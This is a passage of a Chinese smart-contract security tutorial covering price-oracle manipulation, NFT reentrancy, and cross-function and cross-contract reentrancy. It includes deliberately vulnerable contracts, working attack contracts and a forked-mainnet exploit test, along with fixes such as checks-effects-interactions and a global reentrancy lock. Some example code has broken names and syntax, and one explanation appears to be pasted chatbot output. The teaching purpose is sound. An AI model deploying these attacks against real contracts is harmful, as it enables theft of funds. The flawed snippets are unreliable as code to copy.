        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // fork指定区块
        vm.createSelectFork(MAINNET_RPC_URL,16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        // 攻击预言机
        // 0. 操纵预言机之前的价格
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore); 
        // 给自己账户 1000000 BUSD
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        // 2. 用busd买weth，推高顺时价格
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        swapBUSDtoWETH(busdAmount, 1);
        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
        // 3. 操纵预言机之后的价格
        uint256 priceAfter = ousd.getPrice();
        console.log("3. ETH price (after attack): %s", priceAfter); 
        // 4. 铸造oUSD
        ousd.swap{value: 1 ether}();
        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
    }

    // Swap BUSD to WETH
    function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            alice,
            block.timestamp
        );

        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }
}
```



## 预防方法

知名区块链安全专家 `samczsun` 在一篇[博客](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle)中总结了预言机操纵的预防方法，这里总结一下：

1. 不要使用流动性差的池子做价格预言机。
2. 不要使用现货/瞬时价格做价格预言机，要加入价格延迟，例如时间加权平均价格（TWAP）。
3. 使用去中心化的预言机。
4. 使用多个数据源，每次选取最接近价格中位数的几个作为预言机，避免极端情况。
5. 在使用Oracle预言机的询价方法如`latestRoundData()`，需要对返回结果进行校验，防止使用过时失效数据。
6. 仔细阅读第三方价格预言机的使用文档及参数设置。

## 总结

这一讲，我们介绍了操纵预言机攻击，并攻击了一个有漏洞的合成稳定币合约，使用`1 ETH`兑换了17万亿稳定币，成为了世界首富（并没有）。

# S16. NFT重入攻击

这一讲，我们将介绍NFT合约的重入攻击漏洞，并攻击一个有漏洞的NFT合约，铸造10个NFT。

## NFT重入风险

我们在[S01 重入攻击](https://github.com/AmazingAng/WTF-Solidity/blob/main/S01_ReentrancyAttack/readme.md)中讲过，重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如`fallback`函数）循环调用合约，将合约中资产转走或铸造大量代币。转账NFT时并不会触发合约的`fallback`或`receive`函数，为什么会有重入风险呢？

这是因为NFT标准（[ERC721](https://github.com/AmazingAng/WTF-Solidity/blob/main/34_ERC721/readme.md)/[ERC1155](https://github.com/AmazingAng/WTF-Solidity/blob/main/40_ERC1155/readme.md)）为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 `ERC721` 的 `safeTransferFrom()` 函数会调用目标地址的 `onERC721Received()` 函数，而黑客可以把恶意代码嵌入其中进行攻击。

我们总结了 `ERC721` 和 `ERC1155` 有潜在重入风险的函数：



![img](https://www.wtf.academy/assets/images/S16-1-26c55b74589314355fc582c310909d32.png)



## 漏洞例子

下面我们学习一个有重入漏洞的NFT合约例子。这是一个`ERC721`合约，每个地址可以免费铸造一个NFT，但是我们通过重入攻击可以一次铸造多个。

### 漏洞合约

`NFTReentrancy`合约继承了`ERC721`合约，它主要有 `2` 个状态变量，`totalSupply`记录NFT的总供给，`mintedAddress`记录已铸造过的地址，防止一个用户多次铸造。它主要有 `2` 个函数：

- 构造函数: 初始化 `ERC721` NFT的名称和代号。
- `mint()`: 铸造函数，每个用户可以免费铸造1个NFT。**注意：这个函数有重入漏洞！**

```solidity
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // 铸造函数，每个用户只能铸造1个NFT
    // 有重入漏洞
    function mint() payable external {
        // 检查是否mint过
        require(mintedAddress[msg.sender] == false);
        // 增加total supply
        totalSupply++;
        // mint
        _safeMint(msg.sender, totalSupply);
        // 记录mint过的地址
        mintedAddress[msg.sender] = true;
    }
}
```

> [!TIP]
>
> ### 重入漏洞
>
> 该合约存在重入攻击的潜在风险，因为 `mint()` 函数在铸造 NFT 之前检查 `mintedAddress` 的状态，但在铸造之后才更新这个状态。攻击者可以利用重入攻击的特性，在铸造函数中调用合约的 `mint()` 方法，从而绕过地址检查并多次铸造 NFT。
>
> ### 示例攻击流程
>
> 1. 攻击者部署一个恶意合约，该合约在 `mint()` 方法被调用时重入到 `NFTReentrancy` 合约的 `mint()` 方法。
> 2. 第一次调用 `mint()` 时，合约检查 `mintedAddress[msg.sender]`，因为是第一次调用，所以检查通过。
> 3. 然后调用 `_safeMint()` 铸造 NFT，此时攻击者的地址被更新为持有者，但 `mintedAddress` 仍然为 `false`。
> 4. 攻击者在 `_safeMint()` 过程中再次调用 `mint()`，再次通过地址检查。
> 5. 继续铸造，直到攻击者希望的数量为止。



### 攻击合约

`NFTReentrancy`合约的重入攻击点在`mint()`函数会调用`ERC721`合约中的`_safeMint()`，从而调用转入地址的`_checkOnERC721Received()`函数。如果转入地址的`_checkOnERC721Received()`包含恶意代码，就能进行攻击。

`Attack`合约继承了`IERC721Receiver`合约，它有 `1` 个状态变量`nft`记录了有漏洞的NFT合约地址。它有 `3` 个函数:

- 构造函数: 初始化有漏洞的NFT合约地址。
- `attack()`: 攻击函数，调用NFT合约的`mint()`函数并发起攻击。
- `onERC721Received()`: 嵌入了恶意代码的ERC721回调函数，会重复调用`mint()`函数，并铸造10个NFT。

```solidity
contract Attack is IERC721Receiver{
    NFTReentrancy public nft; // 有漏洞的nft合约地址

    // 初始化NFT合约地址
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }
    
    // 攻击函数，发起攻击
    function attack() external {
        nft.mint();
    }

    // ERC721的回调函数，会重复调用mint函数，铸造10个
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
```

> [!NOTE]
>
> **`attack()` 函数的作用**：虽然 `attack()` 函数本身的逻辑非常简单，只是调用了 `nft.mint()`，但它实际上触发了重入攻击的开始。在 `NFTReentrancy` 合约中，`mint()` 函数会通过回调 `onERC721Received` 再次调用 `mint()`，从而导致重入攻击的发生。
>
> 为了更清晰地理解，可以想象以下攻击流程：
>
> 1. 用户调用 `attack()`。
> 2. `NFTReentrancy.mint()` 检查 `mintedAddress` 为 `false`，增加 `totalSupply`，调用 `_safeMint` 进行铸造。
> 3. 触发 `onERC721Received` 回调，此时合约持有 1 个 NFT。
> 4. `onERC721Received` 检查当前持有的 NFT 数量小于 10，因此再次调用 `nft.mint()`。
> 5. 重复以上步骤，直到铸造出 10 个 NFT。



## Remix复现

1. 部署`NFTReentrancy`合约。
2. 部署`Attack`合约，参数填`NFTReentrancy`合约地址。
3. 调用`Attack`合约的`attack()`函数发起攻击。
4. 调用`NFTReentrancy`合约的`balanceOf()`函数查询`Attack`合约的持仓，可以看到持有`10`个NFT，攻击成功。



![img](https://www.wtf.academy/assets/images/S16-2-bcfa478d478ac63ad9bb0d58916f6149.png)



## 预防方法

主要有两种办法来预防重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。

1. 检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。我们可以用这个模式修复有漏洞的`mint()`函数:

   ```solidity
       function mint() payable external {
           // 检查是否mint过
           require(mintedAddress[msg.sender] == false);
           // 增加total supply
           totalSupply++;
           // 记录mint过的地址
           mintedAddress[msg.sender] = true;
           // mint
           _safeMint(msg.sender, totalSupply);
       }
   ```

   

2. 重入锁：它是一种防止重入函数的修饰器（modifier）。建议直接使用OpenZeppelin提供的[ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)

## 总结

这一讲，我们介绍了NFT的重入攻击漏洞，并攻击了一个有漏洞的NFT合约，铸造了10个NFT。目前主要有两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。

# S17. "跨服"重入攻击

在智能合约安全领域，重入攻击永远是一个备受关注的话题。在[重入攻击](https://www.wtf.academy/docs/solidity-104/S01_ReentrancyAttack/)这一讲中，`0xAA`生动展示了教科书级经典的重入攻击思路；而在生产环境中，常常有一些更加安排巧妙，复杂的实例一直在以各种新瓶装旧酒的面目不断地出现，并且成功地对很多项目造成了破坏。这些实例展示了攻击者如何利用智能合约中的漏洞来搭配组合出精心策划的攻击。这一讲，我们将介绍一些生产环境中真实发生的具有“跨服”属性的重入攻击案例。所谓“跨服”，是对这一类型的攻击目标的生动概括，因为它们共同的手段是从某一个函数开始入手，但是攻击对象却是其他函数/合约/项目等等。在本讲中我会带领大家简化并提炼其操作，探讨攻击者的思路、利用的漏洞以及对应的防御措施。通过了解这些实例，我们可以更好地理解重入攻击的本质，并且提高我们编写安全智能合约的技能和意识。

注：以下所展示的代码示例均为简化过的`pseudo-code`, 主要以阐释攻击思路为目的。内容源自众多`Web3 Security Researchers`所分享的审计案例,感谢他们的贡献！

## 1. 跨函数重入攻击

*“那一年，我戴了重入锁，不知对手为何物。直到那天，那个男人从天而降，还是卷走了我的银钱...” -- 戴锁婆婆*

请看如下代码示例：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract VulnerableBank {
  mapping(address => uint256) public balances;

  uint256 private _status; // 重入锁

  // 重入锁
  modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
       require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
      _status = 1;
      _;
      // 调用结束，将 _status 恢复为0
      _status = 0;
  }

  function deposit() external payable {
    require(msg.value > 0, "Deposit amount must ba greater than 0");
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 _amount) external nonReentrant {
    uint256 balance = balances[msg.sender];
    require(balance >= _amount, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Withdraw failed");

    balances[msg.sender] = balance - _amount;
  }

  function transfer(address _to, uint256 _amount) external {
    uint256 balance = balances[msg.sender];
    require(balance >= _amount, "Insufficient balance");

    balances[msg.sender] -= _amount;
    balances[_to] += _amount;
  }
}
```

> [!TIP]
>
> 你说得对，在调用 `transfer` 函数后，攻击者的余额实际上会被扣除。下面是更正后的分析：
>
> ### 详细攻击过程分析
>
> 1. **合约背景**：
>    - `VulnerableBank` 合约允许用户存款、提取和转账。`withdraw` 函数在提取 ETH 时存在重入攻击的风险。
>
> 2. **攻击者准备攻击**：
>    - 攻击者部署 `Attack2Contract`，并设置 `victim` 为 `VulnerableBank` 合约的地址。
>
> 3. **存款**：
>    - 攻击者调用 `deposit` 函数，将 ETH 存入合约中，增加其在合约中的余额。
>
> 4. **发起取款**：
>    - 攻击者调用 `withdraw` 函数，提取其在合约中的余额。
>    - 当 ETH 被发送给攻击者时，合约仍未更新攻击者的余额，攻击者的原始余额仍被保留。
>
> 5. **重入攻击触发**：
>    - `withdraw` 函数成功完成后，攻击者合约的 `receive` 函数被触发。
>    - 在 `receive` 函数中，攻击者读取其在 `VulnerableBank` 合约中的余额并调用 `transfer` 函数。
>
> 6. **调用 `transfer` 函数**：
>    - `transfer` 函数会在合约内部更新 `balances`，将攻击者的余额减少 `_amount`。
>    - 因为攻击者在 `withdraw` 函数中提取了 ETH，所以在这次调用中，攻击者的余额确实会被扣除。
>
> 7. **攻击者实现“双花”**：
>    - 尽管攻击者的余额在 `transfer` 调用后会被减少，但攻击者的余额在 `withdraw` 调用后已经成功转移到了其地址。
>    - 攻击者通过 `transfer` 函数将其“余额”转移到了 `owner` 地址（可以是攻击者控制的另一个地址）。
>    - 实际上，攻击者在这一过程中实现了在没有相应 ETH 存在的情况下，仍然能够转移价值，达到了“双花”的效果。
>
> 

在上面的`VulnerableBank`合约中，可以看到转账`ETH`的步骤仅存在于`withdraw`这一个函数之内，而此函数已经使用了重入锁`nonReentrant`。那么，还有什么方法来对这个合约进行重入攻击呢？

请看如下攻击者合约示例：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../IVault.sol";

contract Attack2Contract {
    address victim;
    address owner;

    constructor(address _victim, address _owner) {
        victim = _victim;
        owner = _owner;
    }

    function deposit() external payable {
        IVault(victim).deposit{value: msg.value}("");
    }

    function withdraw() external {
        Ivault(victim).withdraw();
    }

    receive() external payable {
        uint256 balance = Ivault(victim).balances[address(this)];
        //在接收到以太币后，该函数会检查攻击者在受害者合约中的余额。
        Ivault(victim).transfer(owner, balance); 
        //然后调用受害者合约的 transfer 函数，将所有余额转移到攻击者地址 owner。
    }
}
```



如上所示，攻击者重入的不再是`withdraw`函数，而是转头去重入没有戴锁的`transfer`函数。`VulnerableBank`合约的设计者的固有思路认为`transfer`函数中只是更改 `balances mapping`而没有转账`ETH`的步骤，所以应该不是重入攻击的对象，所以没有给它加上锁。而攻击者利用`withdraw`先将`ETH`转账，转账完成的时候`balances`没有立即更新，而随机调用了`transfer`函数将自己原本已不存在的余额成功转移给了另一个地址`owner`，而此地址完全可以是攻击者的一个小号而已。由于`transfer`函数没有转账`ETH`所以不会持续将执行权交出，所以这个重入只是攻击了额外一次便结束。结果是攻击者“无中生有”出了这一部分钱，实现了“双花”的功效。

那么问题来了：

*如果改进一下， 将合约中的所有跟资产转移沾边的函数都加上重入锁，那是不是就安全了呢？？？*

请看下面的进阶案例...

## 2. 跨合约重入攻击

我们的第二位受害者是一个多合约组合系统，它是一个去中心化合约交易平台，我们只看问题发生的关键处，是跟两个合约有关。第一个合约是`TwoStepSwapManager`, 它是面向用户的合约，里面包含有允许用户直接发起的提交一个swap交易的函数，还有同样是可由用户发起的，用来取消正在等待执行但尚未执行的swap交易的函数；第二个合约是`TwoStepSwapExecutor`, 它是只能由管理的角色来发起的交易，用于执行某个处于等待中的swap交易。这两个合约的 *部分* 示例代码如下：

```solidity
// Contracts to create and manage swap "requests"

contract TwoStepSwapManager {
    struct Swap {
        address user;
        uint256 amount;
        address[] swapPath;
        bool unwrapnativeToken;
    }

    uint256 swapNonce;
    mapping(uint256 => Swap) pendingSwaps;

    uint256 private _status; // 重入锁

    // 重入锁
    modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
        require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
        _status = 1;
        _;
      // 调用结束，将 _status 恢复为0
        _status = 0;
     }

    function createSwap(uint256 _amount, address[] _swapPath, bool _unwrapnativeToken) external nonReentrant {
        IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount);
        pendingSwaps[++swapNounce] = Swap({
            user: msg.sender,
            amount: _amount,
            swapPath: _swapPath,
            unwrapNativeToken: _unwrapNativeToken
        });
    }

    function cancelSwap(uint256 _id) external nonReentrant {
        Swap memory swap = pendingSwaps[_id];
        require(swap.user == msg.sender);
        delete pendingSwaps[_id];

        IERC20(swapPath[0]).safeTransfer(swap.user, swap.amount);
    }
}
```

> [!TIP]
>
> 好的，我们可以将 `TwoStepSwapManager` 合约分段进行详细解释。以下是合约的逐步解析：
>
> ### 1. 合约声明和状态变量
>
> ```solidity
> contract TwoStepSwapManager {
>     struct Swap {
>         address user;
>         uint256 amount;
>         address[] swapPath;
>         bool unwrapnativeToken;
>     }
> 
>     uint256 swapNonce;
>     mapping(uint256 => Swap) pendingSwaps;
> 
>     uint256 private _status; // 重入锁
> ```
>
> - **合约声明**:
>   - `TwoStepSwapManager` 是合约的名称，负责管理交换请求。
>
> - **结构体 `Swap`**:
>   - 定义了交换请求的结构，包括：
>     - `user`: 发起请求的用户地址。
>     - `amount`: 用户想要交换的金额。
>     - `swapPath`: 交换过程中涉及的代币地址数组。
>     - `unwrapnativeToken`: 是否解包原生代币（如从 WETH 转换为 ETH）。
>
> - **状态变量**:
>   - `swapNonce`: 用于唯一标识每个交换请求，防止重复。
>   - `pendingSwaps`: 映射，用于存储所有待处理的交换请求，键为请求的 ID，值为 `Swap` 结构体。
>
> - **重入锁 `_status`**:
>   - 一个整数变量，用于控制重入状态，确保在进行重要操作时不会被重入攻击。
>
> ### 2. 重入锁修饰符
>
> ```solidity
> modifier nonReentrant() {
>     require(_status == 0, "ReentrancyGuard: reentrant call");
>     _status = 1;
>     _;
>     _status = 0;
> }
> ```
>
> - **修饰符 `nonReentrant`**:
>   - 该修饰符用于保护函数，确保函数在执行期间不能被重入。
>   - `require(_status == 0, ...)`: 检查 `_status` 是否为 0，如果不是，则说明已经有其他函数正在执行，抛出错误。
>   - `_status = 1`: 将 `_status` 设置为 1，表示进入了关键区域。
>   - `_`: 此处会执行被修饰的函数。
>   - `_status = 0`: 函数执行完毕后，将 `_status` 复位为 0，允许其他函数的调用。
>
> ### 3. 创建交换请求的函数
>
> ```solidity
> function createSwap(uint256 _amount, address[] _swapPath, bool _unwrapnativeToken) external nonReentrant {
>     IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount);
>     pendingSwaps[++swapNounce] = Swap({
>         user: msg.sender,
>         amount: _amount,
>         swapPath: _swapPath,
>         unwrapNativeToken: _unwrapnativeToken
>     });
> }
> ```
>
> - **函数 `createSwap`**:
>   - 用于创建新的交换请求。
>   - **参数**:
>     - `_amount`: 用户希望交换的代币数量。
>     - `_swapPath`: 代币交换路径（地址数组）。
>     - `_unwrapnativeToken`: 布尔值，指示是否需要解包原生代币。
>   
> - **功能**:
>   - `IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount)`: 从发起请求的用户转移代币到合约中。
>   - `pendingSwaps[++swapNounce] = Swap(...)`: 创建新的 `Swap` 结构体并存储在 `pendingSwaps` 映射中，同时增加 `swapNonce` 的值。
>
> ### 4. 取消交换请求的函数
>
> ```solidity
> function cancelSwap(uint256 _id) external nonReentrant {
>     Swap memory swap = pendingSwaps[_id];
>     require(swap.user == msg.sender);
>     delete pendingSwaps[_id];
> 
>     IERC20(swapPath[0]).safeTransfer(swap.user, swap.amount);
> }
> ```
>
> - **函数 `cancelSwap`**:
>   - 用于取消指定的交换请求。
>   - **参数**:
>     - `_id`: 要取消的交换请求的 ID。
>   
> - **功能**:
>   - `Swap memory swap = pendingSwaps[_id]`: 从 `pendingSwaps` 中获取要取消的交换请求。
>   - `require(swap.user == msg.sender)`: 检查发起请求的用户是否是当前调用者，确保只有请求者可以取消自己的请求。
>   - `delete pendingSwaps[_id]`: 删除该请求，标记为已取消。
>   - `IERC20(swapPath[0]).safeTransfer(swap.user, swap.amount)`: 将代币返还给用户。
>
> ### 总结
>
> 这个合约实现了一个交换请求管理器，允许用户创建和取消代币交换请求。使用了重入锁来防止重入攻击，并通过结构体来管理每个交换请求的状态。



```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// Contract to exeute swaps

contract TwoStepSwapExecutor {


    /* 
        Logic to set prices etc... 
    */


    uint256 private _status; // 重入锁

    // 重入锁
    modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
        require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
        _status = 1;
        _;
      // 调用结束，将 _status 恢复为0
        _status = 0;
    }

    function executeSwap(uint256 _id) external onlySwapExecutor nonReentrant {
        Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id);

        // If a swapPath ends in WETH and unwrapNativeToken == true, send ether to the user
        ISwapManager(swapManager).swap(swap.user, swap.amount, swap.swapPath, swap.unwrapNativeToken);

        ISwapManager(swapManager).delete(pendingSwaps[_id]);
    }
}
```

> [!TIP]
>
> 我们来逐段分析这个 `TwoStepSwapExecutor` 合约，了解其结构和功能。
>
> ### 1. 合约声明和状态变量
>
> ```solidity
> // SPDX-License-Identifier: MIT
> pragma solidity 0.8.17;
> 
> // Contract to execute swaps
> contract TwoStepSwapExecutor {
> 
>     uint256 private _status; // 重入锁
> ```
>
> - **合约声明**:
>   - `TwoStepSwapExecutor` 是合约的名称，主要用于执行代币交换操作。
>
> - **状态变量**:
>   - `_status`: 用于实现重入锁的整数变量。它控制合约的重入状态，确保在执行重要操作时不会被重入攻击。
>
> ### 2. 重入锁修饰符
>
> ```solidity
> modifier nonReentrant() {
>     require(_status == 0, "ReentrancyGuard: reentrant call");
>     _status = 1;
>     _;
>     _status = 0;
> }
> ```
>
> - **修饰符 `nonReentrant`**:
>   - 用于保护合约中的关键函数，确保它们不会在执行期间被重入。
>   - `require(_status == 0, ...)`: 确保 `_status` 为 0，以防止重入。
>   - `_status = 1`: 表示合约进入了关键区域。
>   - `_`: 这是修饰符的主体，表示执行被修饰的函数。
>   - `_status = 0`: 函数执行完毕后，恢复 `_status` 为 0，以允许后续的调用。
>
> ### 3. 执行交换的函数
>
> ```solidity
> function executeSwap(uint256 _id) external onlySwapExecutor nonReentrant {
>     Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id);
> /*   struct Swap {
>         address user;
>         uint256 amount;
>         address[] swapPath;
>         bool unwrapnativeToken;
>     } 
> */
> 
> 
>     // If a swapPath ends in WETH and unwrapNativeToken == true, send ether to the user
>     ISwapManager(swapManager).swap(swap.user, swap.amount, swap.swapPath, swap.unwrapNativeToken);
> 
>     ISwapManager(swapManager).delete(pendingSwaps[_id]);
> }
> ```
>
> - **函数 `executeSwap`**:
>   - 用于执行代币交换请求。
>   - **参数**:
>     - `_id`: 代表待执行的交换请求的 ID。
>
> - **功能**:
>   - `Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id)`: 从 `swapManager` 获取待处理的交换请求，并将其存储在 `swap` 变量中。
>   - `ISwapManager(swapManager).swap(...)`: 调用交换管理合约中的 `swap` 函数，执行实际的代币交换操作，使用从 `pendingSwaps` 中获得的 `user`、`amount`、`swapPath` 和 `unwrapNativeToken` 作为参数。
>     - 如果 `swapPath` 以 WETH 结尾，并且 `unwrapNativeToken` 为 `true`，合约将发送 ETH 给用户（这个逻辑在注释中提到）。
>   - `ISwapManager(swapManager).delete(pendingSwaps[_id])`: 删除对应的交换请求，以防止再次执行相同的请求。
>
> ### 总结
>
> `TwoStepSwapExecutor` 合约负责处理代币交换的执行，确保交换操作安全地执行，防止重入攻击。通过使用 `nonReentrant` 修饰符，它提供了基本的安全措施。在执行交换时，它从 `ISwapManager` 合约获取待处理的交换请求并执行相应的操作。

从上面两个合约的示例代码可以看出，所有相关的函数均使用了重入锁。然而，那个男人还是成功地对戴锁婆婆施展了重入魔法，再再再一次卷走了原本不属于他的钱财。这一次，他又是如何做到的呢？

俗话说得好， *“灯下黑“* ，答案就在最表面上反而容易被忽视 --- 因为这是 两 个 合 约...锁的状态是不互通的！ 管理员调用了`executeSwap`来执行了那个攻击者提交的swap，此合约的重入锁开始生效变成`1`。当运行到中间那步`swap（）`的时候，发起了`ETH`转账，将执行权交给了攻击者的恶意合约的`fallback`函数，在那里被设置了对`TwoStepSwapManager`合约的`cancelSwap`函数的调用，而此时这个合约的重入锁还是`0`，所以`cancelSwap`开始执行，此合约的重入锁开始生效变成`1`，然而为时已晚。。。 攻击者收到了`executeSwap`发送给他的swap过来的`ETH`，同时还收到了`cancelSwap`退给他的当初送出去用来swap的本金代币。他他他又一次“无中生有”了！

> [!NOTE]
>
> ### 攻击步骤分析
>
> 1. **合约设计的重入锁**:
>    - `TwoStepSwapManager` 和 `TwoStepSwapExecutor` 合约都实现了重入锁，分别通过 `_status` 变量来控制。
>    - 在 `executeSwap` 函数中，当攻击者调用该函数时，合约的 `_status` 被设置为 1，表示处于锁定状态。
>
> 2. **攻击者的交换请求**:
>    - 攻击者首先在 `TwoStepSwapManager` 中提交了一个 swap 请求，并在合约的状态未改变前，调用 `executeSwap` 来执行这个请求。
>    - 在调用 `executeSwap` 时，合约获取到了攻击者的 swap 详情，并开始执行交换。
>
> 3. **转账操作**:
>    - 当执行 `swap` 函数时，合约发起了 ETH 的转账，将资金发送给攻击者的合约。
>    - 此时，转账操作将控制权转移到攻击者的合约中，即进入攻击者的 `fallback` 函数（如果合约没有 `fallback` 函数，则会调用 `receive` 函数）。
>
> 4. **攻击者的 `fallback` 函数**:
>    - 在攻击者的合约中，`fallback` 或 `receive` 函数被设计成触发一个对 `TwoStepSwapManager` 合约的 `cancelSwap` 函数的调用。
>    - 由于此时 `cancelSwap` 是在攻击者的合约中被调用，而 `TwoStepSwapManager` 的 `_status` 为 0（它的重入锁没有被激活），因此可以正常执行。
>
> 5. **执行 `cancelSwap` 函数**:
>    - 在 `cancelSwap` 函数中，合约会将原本用于 swap 的本金代币退还给攻击者。
>    - 由于 `cancelSwap` 函数的执行是在攻击者合约的上下文中进行的，而不是在 `TwoStepSwapExecutor` 中，因此其重入锁没有生效，攻击者可以顺利拿回代币。
>
> 6. **获取额外的资金**:
>    - 攻击者成功获得了 `executeSwap` 函数转给他的 ETH，以及通过 `cancelSwap` 退回来的代币。
>    - 这实现了攻击者的“双花”效果，即在未付出任何实际代价的情况下获取了额外的资金。
>
> ### 总结
>
> 这个攻击示例展示了合约设计中的潜在安全隐患，特别是多个合约之间的交互时锁的状态并不共享，攻击者可以利用这一点进行重入攻击。尽管 `TwoStepSwapManager` 和 `TwoStepSwapExecutor` 都实现了重入锁，但由于锁状态的局限性，攻击者能够在不同合约之间执行恶意操作。
>
> ### 防范措施
>
> 为防止类似的重入攻击，可以考虑以下措施：
>
> 1. **全局重入锁**: 将重入锁的状态进行全局控制，确保即使跨合约调用时也能保持锁的有效性。
>   
> 2. **检查-效果-交互模式**: 在合约逻辑中遵循检查-效果-交互模式，即先进行状态更新，然后再进行外部调用，从而避免在状态未更新时受到重入攻击。
>
> 3. **使用安全的代币转账方法**: 使用 `transfer` 而不是 `call` 进行 ETH 的转账，虽然这不能完全消除重入风险，但能降低攻击者成功利用重入漏洞的几率。
>
> 4. **限制可调用的外部合约**: 仅允许可信合约调用特定功能，减少潜在的攻击面。



### 全局重入锁

若想要防范这种跨合约重入攻击，我这里送同学们一个重入锁的升级版 -- 全局重入锁。适合用于同学们以后架构多合约系统。请看以下简易代码思路：

```solidity
pragma solidity ^0.8.0;

import "../data/Keys.sol";
import "../data/DataStore.sol";

abstract contract GlobalReentrancyGuard{
    uint256 private constant NOT_ENTERED = 0;
    uint256 private constant ENTERED = 1;

    DataStore public immutable dataStore;

    constructor(DataStore _datastore) {
        dataStore = _dataStore;
    }

    modifier globalNonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        uint256 status = dataStore.getUint(Keys.REENTRANCY_GUARD_STATUS);

        require(status == NOT_ENTERED, "ReentrancyGuard: reentrant call");

        dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, ENTERED);
    }

    function _nonReentrantAfter() private {
        dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, NOT_ENTERED);
    }
}
```

> [!NOTE]
>
> 这个合约 `GlobalReentrancyGuard` 实现了一个全局的重入锁，以保护合约中可能遭受重入攻击的函数。以下是对这段代码的逐行分析和解释：
>
> ### 合约结构和变量
>
> 1. **合约定义和导入**:
>    ```solidity
>    pragma solidity ^0.8.0;
>    
>    import "../data/Keys.sol";
>    import "../data/DataStore.sol";
>    ```
>    - 指定 Solidity 编译器版本为 `0.8.0` 或以上，并导入 `Keys` 和 `DataStore` 合约。`DataStore` 合约用于存储和管理状态数据。
>
> 2. **状态常量**:
>    ```solidity
>    uint256 private constant NOT_ENTERED = 0;
>    uint256 private constant ENTERED = 1;
>    ```
>    - 定义了两个常量，用于表示重入锁的状态：`NOT_ENTERED` 表示未进入，`ENTERED` 表示已进入。这两个状态将用于管理重入的状态。
>
> 3. **数据存储**:
>    ```solidity
>    DataStore public immutable dataStore;
>    
>    constructor(DataStore _datastore) {
>        dataStore = _dataStore;
>    }
>    ```
>    - `dataStore` 是一个不可变的状态变量，存储了 `DataStore` 合约的地址。构造函数接受一个 `DataStore` 合约的地址并将其赋值。
>
> ### 重入锁的实现
>
> 4. **重入锁修饰符**:
>    ```solidity
>    modifier globalNonReentrant() {
>        _nonReentrantBefore();
>        _;
>        _nonReentrantAfter();
>    }
>    ```
>    - `globalNonReentrant` 是一个修饰符，用于在函数执行前后进行重入检查。它在函数执行前调用 `_nonReentrantBefore`，在函数执行后调用 `_nonReentrantAfter`。
>
> 5. **重入状态检查**:
>    ```solidity
>    function _nonReentrantBefore() private {
>        uint256 status = dataStore.getUint(Keys.REENTRANCY_GUARD_STATUS);
>    
>        require(status == NOT_ENTERED, "ReentrancyGuard: reentrant call");
>    
>        dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, ENTERED);
>    }
>    ```
>    - `_nonReentrantBefore` 私有函数在函数执行前检查重入状态。
>    - 通过 `dataStore.getUint(Keys.REENTRANCY_GUARD_STATUS)` 获取当前的重入状态。
>    - 如果状态为 `NOT_ENTERED`，则执行继续，否则抛出错误，防止重入。
>    - 将状态设置为 `ENTERED`，表示进入状态。
>
> 6. **重置重入状态**:
>    ```solidity
>    function _nonReentrantAfter() private {
>        dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, NOT_ENTERED);
>    }
>    ```
>    - `_nonReentrantAfter` 私有函数在函数执行后将重入状态重置为 `NOT_ENTERED`，以便后续调用可以正常执行。
>
> ### 总结
>
